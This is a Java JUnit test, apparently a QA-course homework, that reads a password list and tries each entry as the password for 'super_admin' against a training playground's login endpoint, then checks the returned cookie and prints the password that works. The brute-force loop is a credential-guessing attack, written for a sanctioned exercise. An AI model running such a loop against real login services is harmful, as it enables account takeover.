import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Password {
    @Test
    public void testRestAssured() throws IOException {
        Map<String, String> credentials = new HashMap<>(); // Словарь для хранения комбинаций логин/пароль
        List<String> passwords = new ArrayList<>(); // Коллекция для хранения списка паролей

        File passwordsList = new File("D:\\_Devel\\LearnQA_JavaAPI\\List_of_passwords.txt"); //Открытие файла со списком паролей
        FileReader fr = new FileReader(passwordsList);
        BufferedReader reader = new BufferedReader(fr); //создаем BufferedReader с существующего FileReader для построчного считывания

        String line = reader.readLine(); // Cчитываем первую строку с паролем
        while (line != null) {
            passwords.add(line); // Записываем строку в список всех паролей
            line = reader.readLine(); // Считываем остальные строки в цикле
        }

        for (String password : passwords) { //Перебираем в цикле все возможные комбинации паролей
            credentials.clear();
            credentials.put("login", "super_admin");
            credentials.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(credentials)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String authCookie = response.getCookie("auth_cookie");

            Response responseCheck = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String authMessage = responseCheck.print();
            if (authMessage.equals("You are authorized")) { // Сравнение полученного сообщения с ожидаемым
                System.out.println("Пароль - " + password); //  Если сообщение совпадает с ожидаемым, то выводим его и пароль
                break; //Принудительно завершаем цикл
            }
        }

        }
    }

